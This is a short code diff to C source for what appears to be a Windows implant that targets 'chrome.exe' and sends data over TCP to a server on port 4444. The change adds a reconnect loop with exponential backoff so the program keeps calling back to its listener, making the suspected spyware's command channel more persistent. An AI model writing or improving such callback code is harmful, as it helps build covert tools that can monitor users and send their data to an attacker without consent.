@@ -11,16 +11,20 @@
 /* ================= CONFIG ================= */
 
 #define TARGET_PROCESS "chrome.exe"   // change as needed
-#define SERVER_IP     "192.168.1.8"
+#define SERVER_IP     "192.168.1.0"
 #define SERVER_PORT   4444
+
+#define BASE_RETRY_DELAY 2000   // ms
+#define MAX_RETRY_DELAY 30000   // ms
 
 /* ================= GLOBALS ================= */
 
 SOCKET g_sock;
+static volatile int connected = 0;
 
 /* ================= TCP ================= */
 
-int tcp_connect(const char* ip, int port) {
+int tcp_connect() {
     WSADATA wsa;
     struct sockaddr_in server;
 
@@ -32,14 +36,34 @@ int tcp_connect(const char* ip, int port) {
         return 0;
 
     server.sin_family = AF_INET;
-    server.sin_port = htons(port);
-    inet_pton(AF_INET, ip, &server.sin_addr);
+    server.sin_port = htons(SERVER_PORT);
+    inet_pton(AF_INET, SERVER_IP, &server.sin_addr);
 
     if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0)
         return 0;
 
-    printf("[+] Connected to %s:%d\n", ip, port);
+    printf("[+] Connected to %s:%d\n", SERVER_IP, SERVER_PORT);
     return 1;
+}
+
+void connect_with_retry() {
+    int attempt = 0;
+
+    while (!connected) {
+        if (tcp_connect()) {
+            return;
+        }
+
+        printf("Failed connection. Attempt: %d\n", attempt);
+
+        int backoff = BASE_RETRY_DELAY * (1 << attempt);
+        if (backoff > MAX_RETRY_DELAY)
+            backoff = MAX_RETRY_DELAY;
+
+        Sleep(backoff);
+
+        attempt++;
+    }
 }
 
 void tcp_send(const char* msg) {
@@ -171,10 +195,7 @@ done:
 
 int main() {
 
-    if (!tcp_connect(SERVER_IP, SERVER_PORT)) {
-        printf("[-] TCP connection failed\n");
-        return 1;
-    }
+    connect_with_retry();
 
     WNDCLASS wc = {0};
     wc.lpfnWndProc = WndProc;
